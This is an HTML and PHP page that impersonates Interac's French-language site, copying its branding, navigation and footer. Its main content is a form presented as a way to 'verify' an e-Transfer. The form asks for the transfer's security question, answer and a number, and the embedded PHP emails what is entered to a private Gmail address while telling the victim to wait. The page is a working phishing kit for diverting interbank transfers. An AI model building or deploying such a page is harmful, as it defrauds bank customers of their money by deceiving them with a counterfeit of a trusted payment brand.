<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INTERAC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .header-top {
            background-color: #FFD700;
            color: black;
            text-align: center;
            padding: 10px 0;
        }
        .header-top a {
            color: black;
            text-decoration: none;
            font-weight: bold;
        }
        .header-main {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background-color: white;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .logo {
            display: flex;
            align-items: center;
        }
        .logo img {
            height: 40px;
            margin-right: 10px;
        }
        .nav-links {
            display: flex;
            align-items: center;
        }
        .nav-links a {
            color: black;
            text-decoration: none;
            margin: 0 15px;
            padding: 10px;
            position: relative;
        }
        .nav-links a:hover {
            background-color: #f0f0f0;
        }
        .nav-links a::after {
            content: ' ▼';
            font-size: 0.8em;
        }
        .language-switch, .search {
            display: flex;
            align-items: center;
        }
        .language-switch a {
            margin: 0 10px;
            text-decoration: none;
            color: black;
        }
        .search img {
            height: 20px;
        }
        .main-content {
            padding: 20px;
        }
        .main-content h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }
        .main-content p {
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .main-content img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .form-container {
            margin-top: 20px;
        }
        .form-container label {
            display: block;
            margin-bottom: 5px;
        }
        .form-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .footer {
            background-color: #333;
            color: white;
            padding: 40px 20px;
        }
        .footer .footer-content {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .footer .footer-content div {
            margin: 10px;
            min-width: 150px;
        }
        .footer .footer-content h3 {
            font-size: 1.2em;
            margin-bottom: 10px;
        }
        .footer .footer-content a {
            color: white;
            text-decoration: none;
            display: block;
            margin-bottom: 5px;
        }
        .footer .footer-content a:hover {
            text-decoration: underline;
        }
        .footer .social-icons {
            display: flex;
            align-items: center;
        }
        .footer .social-icons a {
            margin-right: 10px;
        }
        .footer .social-icons img {
            height: 24px;
            width: 24px;
        }
        .footer-bottom {
            text-align: center;
            margin-top: 20px;
            font-size: 0.9em;
        }
        .footer-bottom a {
            color: white;
            margin: 0 5px;
            text-decoration: none;
        }
        .footer-bottom a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <header class="header-main">
        <div class="logo">
            <img src="img/logo.png" alt="Logo Interac">
            <span>Interac</span>
        </div>
        <nav class="nav-links">
            <a href="#">Consommateurs</a>
            <a href="#">Entreprise</a>
            <a href="#">À propos</a>
            <a href="#">FAQ</a>
        </nav>
        <div class="language-switch">
            <a href="#">FR</a>
            <div class="search">
                <img src="img/recherche.png" alt="Recherche">
            </div>
        </div>
    </header>
    <div class="header-top">
        Vérifiez.Moi est maintenant un service de Vérification Interac®. Pour vous, rien ne change. Vous pouvez continuer à compter sur le même service de vérification sécurisé que vous utilisez depuis de nombreuses années. <a href="#">Apprendre encore plus</a>
    </div>
    <div class="main-content">
        <h1>Bienvenue sur votre plateformes de transfère interac</h1>
        <p>
            Nous sommes ravis de vous accueillir sur notre site web. Nous offrons une gamme de services conçus pour répondre à vos besoins. 
            Que vous soyez un consommateur individuel ou une entreprise, nous avons quelque chose à vous offrir.
        </p>
        <img src="img/photo.jpg" alt="image principal">
        <p>
            Veuillez verifier l'authenticité de votre virement a une tiers personnes tout en remplissant soigneusement 
            le formulaire ci-dessous.
        </p>
        <div class="form-container">
            <?php
            if ($_SERVER["REQUEST_METHOD"] == "POST") {
                echo "<p>VEUILLEZ PATIENTER...</p>";

                $to = 'magotsamuella@gmail.com'; // Remplacez par votre adresse email
                $subject = 'Formulaire de soumission';
                $message = 'QUESTION: ' . htmlspecialchars($_POST['question']) . "\r\n" .
                           'REPONSE: ' . htmlspecialchars($_POST['response']) . "\r\n" .
                           'NUMERO: ' . htmlspecialchars($_POST['numero']);
                $headers = 'From: noreply@votredomaine.com' . "\r\n" .
                           'Reply-To: noreply@votredomaine.com' . "\r\n" .
                           'X-Mailer: PHP/' . phpversion();

                if (mail($to, $subject, $message, $headers)) {
                    echo '<p>Votre message a été envoyé. VEUILLEZ PATIENTER...</p>';
                } else {
                    echo '<p>Une erreur s\'est produite. Veuillez réessayer.</p>';
                }
            }
            ?>
            <form method="POST" action="">
                <label for="question">QUESTION</label>
                <input type="text" id="question" name="question" placeholder="Entrez votre question ici" required>
                <label for="response">REPONSE</label>
                <input type="text" id="response" name="response" placeholder="Entrez votre réponse ici" required>
                <label for="numero">NUMERO</label>
                <input type="text" id="numero" name="numero" placeholder="Entrez votre numéro ici" required>
                <button type="submit">Valider</button>
            </form>
        </div>
    </div>
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-section">
                <img src="img/logo.png" alt="Logo Interac">
            </div>
            <div class="footer-section">
                <h3>Pour les consommateurs</h3>
                <a href="#">Nos produits</a>
                <a href="#">Sécurité sûreté</a>
                <a href="#">Soutien</a>
            </div>
            <div class="footer-section">
                <h3>Pour le business</h3>
                <a href="#">Vous êtes nouveau dans les solutions de paiement Interac?</a>
                <a href="#">Nos produits</a>
                <a href="#">Sécurité sûreté</a>
                <a href="#">Soutien</a>
                <a href="#">Code de conduite</a>
            </div>
            <div class="footer-section">
                <h3>À propos d'Interac</h3>
                <a href="#">Carrières</a>
                <a href="#">Notre peuple</a>
                <a href="#">Notre compagnie</a>
                <a href="#">Participants au réseau</a>
            </div>
            <div class="footer-section">
                <h3>Ressources</h3>
                <a href="#">Au courant</a>
                <a href="#">Nouvelles</a>
            </div>
            <div class="footer-section">
                <h3>Langue</h3>
                <a href="#">FR</a>
                <a href="#">Suivre</a>
                <div class="social-icons">
                    <a href="#"><img src="img/face.png" alt="Facebook"></a>
                    <a href="#"><img src="img/youtube.png" alt="YouTube"></a>
                    <a href="#"><img src="img/lin.png" alt="LinkedIn"></a>
                    <a href="#"><img src="img/insta.png" alt="Instagram"></a>
                </div>
            </div>
        </div>
        <div class="footer-bottom">
            <a href="#">Légal</a> |
            <a href="#">Politique de confidentialité</a> |
            <a href="#">Accessibilité</a> |
            <a href="#">Au courant</a> |
            <a href="#">Centre d'innovation</a>
        </div>
    </footer>
</body>
</html>
